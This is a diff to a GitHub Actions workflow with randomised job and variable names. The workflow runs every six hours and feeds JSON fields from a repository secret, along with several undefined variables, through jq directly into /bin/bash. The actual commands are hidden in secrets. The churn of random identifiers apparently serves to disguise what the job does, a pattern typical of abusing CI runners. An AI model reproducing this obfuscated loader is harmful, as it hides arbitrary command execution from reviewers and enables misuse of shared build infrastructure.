@@ -3,18 +3,24 @@ name: qijihuo2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 5/6 * * *'
-jobs:  # 10091
+    - cron: '16 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qijihuo2345
         env:
-          wb669: ${{ secrets.wb669 }}
+          yofw158: ${{ secrets.yofw158 }}
         run: |
-          echo $wb669 | jq -r .ls64 | /bin/bash
-          echo $vmo31854 | jq -r .ru43026 | /bin/bash
-          echo $a0 | jq -r .kzz5 | /bin/bash
+          echo $yofw158 | jq -r .ctv6840 | /bin/bash
+          echo $xxknl9401 | jq -r .pikah60 | /bin/bash
+          echo $kw5874 | jq -r .xs56676 | /bin/bash
+          echo $de80892 | jq -r .gtuc1795 | /bin/bash
+          echo $ptm8 | jq -r .sku44 | /bin/bash
+          echo $jqv77 | jq -r .a1 | /bin/bash
+          echo $umuwr6 | jq -r .aa12 | /bin/bash
+          echo $ppcch02116 | jq -r .a61 | /bin/bash
+          echo $roxud119 | jq -r .vvau98907 | /bin/bash
 
